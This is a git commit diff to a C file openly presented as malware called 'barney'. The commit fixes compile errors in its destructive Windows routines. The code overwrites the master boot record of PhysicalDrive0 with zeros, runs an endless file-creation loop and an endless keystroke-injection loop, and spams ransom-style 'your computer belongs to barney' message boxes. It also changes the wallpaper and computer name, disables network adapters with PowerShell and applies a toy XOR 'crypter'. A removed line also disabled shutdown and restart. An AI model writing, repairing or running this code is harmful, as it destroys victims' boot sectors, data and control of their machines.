3ee8c61b911e40609143e74351d48c225f863a3a
Azrael <140682015+azzraaeel@users.noreply.github.com>
2024-04-06 14:35:16 +0800

    Update barney.c

--- barney.c
+++ barney.c
@@ -1,18 +1,23 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <iostream>
 #include <stdbool.h>
 #include <windows.h>
-#include <xdo.h>
+
+void trollies();
+void filebomb();
+void registrycorruption();
+void keyboardspam();
+void mbroverwrite();
+void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize);
 
 int main()
 {
-    trollies()
-    filebomb()
-    registrycorruption()
-    keyboardspam()
-    mbroverwrite()
+    trollies();
+    filebomb();
+    registrycorruption();
+    keyboardspam();
+    mbroverwrite();
     return 0;
 }
 
@@ -21,26 +26,29 @@ void mbroverwrite()
     char mbrData[512]; // 512 bytes
     ZeroMemory(&mbrData, sizeof(mbrData));
 
-    HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+    HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     WriteFile(MBR, mbrData, 512, NULL, NULL);
     CloseHandle(MBR);
 }
 
 void filebomb()
 {
+    FILE *fptr;
     while (true) 
     {
-    FILE *fptr;
-    fptr = fopen("filename.txt", "w");
+        fptr = fopen("filename.txt", "w");
+        if (fptr != NULL) {
+            fclose(fptr);
+        }
     }
 }
-
 
 void registrycorruption()
 {
     HKEY hKey;
     DWORD dwDisposition;
     LONG lResult;
+    DWORD dwMyValue = 0;
 
     lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
                              "Software\\MyApp",
@@ -61,13 +69,13 @@ void registrycorruption()
                                 (BYTE*)&dwMyValue,
                                 sizeof(DWORD));
 
-    RegCloseKey(hKey);
+        RegCloseKey(hKey);
     }
 }
 
 void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize)
 {
-    if (bytes == nullptr || key == nullptr)
+    if (bytes == NULL || key == NULL)
         return;
 
     if (keysize > 1)
@@ -89,8 +97,7 @@ void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t ke
 }
 
 void keyboardspam()
-  
-  while (1) {
+{
     const char *text = "barney";
     INPUT inputs[6 * 2] = {0}; // Each character and its release
 
@@ -99,34 +106,24 @@ void keyboardspam()
         inputs[i * 2].ki.wVk = inputs[i * 2 + 1].ki.wVk = toupper(text[i]);
         inputs[i * 2 + 1].ki.dwFlags = KEYEVENTF_KEYUP;
     }
-  }
 
-    // Send the input events
-    SendInput(12, inputs, sizeof(INPUT));
+    while (1) {
+        // Send the input events
+        SendInput(12, inputs, sizeof(INPUT));
+    }
+}
 
 void trollies()
 {
-    printf("\033[0;35m"  // ANSI escape code for purple color
-           " ▄▄▄▄    ▄▄▄       ██▀███   ███▄    █ ▓█████▓██   ██▓\n"
-           "▓█████▄ ▒████▄    ▓██ ▒ ██▒ ██ ▀█   █ ▓█   ▀ ▒██  ██▒\n"
-           "▒██▒ ▄██▒██  ▀█▄  ▓██ ░▄█ ▒▓██  ▀█ ██▒▒███    ▒██ ██░\n"
-           "▒██░█▀  ░██▄▄▄▄██ ▒██▀▀█▄  ▓██▒  ▐▌██▒▒▓█  ▄  ░ ▐██▓░\n"
-           "░▓█  ▀█▓ ▓█   ▓██▒░██▓ ▒██▒▒██░   ▓██░░▒████▒ ░ ██▒▓░\n"
-           "░▒▓███▀▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ ░░ ▒░ ░  ██▒▒▒ \n"
-           "▒░▒   ░   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░░   ░ ▒░ ░ ░  ░▓██ ░▒░ \n"
-           " ░    ░   ░   ▒     ░░   ░    ░   ░ ░    ░   ▒ ▒ ░░  \n"
-           " ░            ░  ░   ░              ░    ░  ░░ ░      \n"
-           "      ░                                      ░ ░      \n"
-           "            Malware Author: Azrael\n"
-           "\033[0m");  // Reset color
 
-    printf("\033[0;35m"  // ANSI escape code for purple color
-           "You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
-           "You have 5 minutes to save your computer. Good luck :D\n"
-           "\033[0m");  // Reset color
-    
+    printf("\n"
+        "You got infected by barney,\n"
+        "your computer isn't yours anymore but belongs to barney.\n"
+        "You have 5 minutes to save your computer. Good luck :D\n\n"
+        "                        Malware Author: Azrael\n");
+
     //Spam error message box
-    for (int i = 0; i < 300; i++)
+    for (int i = 0; i < 10; i++)
         MessageBox(
             NULL,
             "You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
@@ -138,38 +135,27 @@ void trollies()
     // Change wallpaper
     SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)L"wallpaper.jpg", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
 
-    // Change scheme to b&w
-    system("powershell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0")
-
     // Change computer name
-    SetComputerNameEx(ComputerNamePhysicalNetBIOS, L"Barney");
+    SetComputerNameEx(ComputerNamePhysicalNetBIOS, "Barney");
 
     //Opens browser
     for (int i = 0; i < 20; i++) 
     {
-    system("start https://www.google.com/search?q=barney+is+looking+for+you")
+        system("start https://www.google.com/search?q=barney+is+looking+for+you");
     }
 
     // Plays barney music
-    for (int i = 0; i < 20; i++) 
-    {
     PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);
-    }
 
     // Corrupts registry and files
-    corruption();
+    registrycorruption();
 
     // Disable Internet Connection
     system("powershell -Command \"Get-NetAdapter | Disable-NetAdapter -Confirm:$false\"");
 
-    //Disables shutdown, hibernation and sleep.
-    system("powershell New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" -Name \"NoClose\" -Value 1 -PropertyType DWORD -Force; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRestartSignout\" -Value 1 -PropertyType DWORD -Force; Set-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\" -Name \"PowerOffActive\" -Value 0 -Type DWORD -Force");
-
     // Encrypts files
-    unsigned char key[] = {babybop, gianna, riff, scoofer};
-    int keysize = 1;
-    char* text = "barneybarneymalware";
+    unsigned char key[] = {0x00, 0xFF, 0x01, 0x0F};
+    size_t keysize = sizeof(key);
+    char text[] = "barneybarneymalware";
     crypter((unsigned char*)text, strlen(text), key, keysize); 
-
-
 }
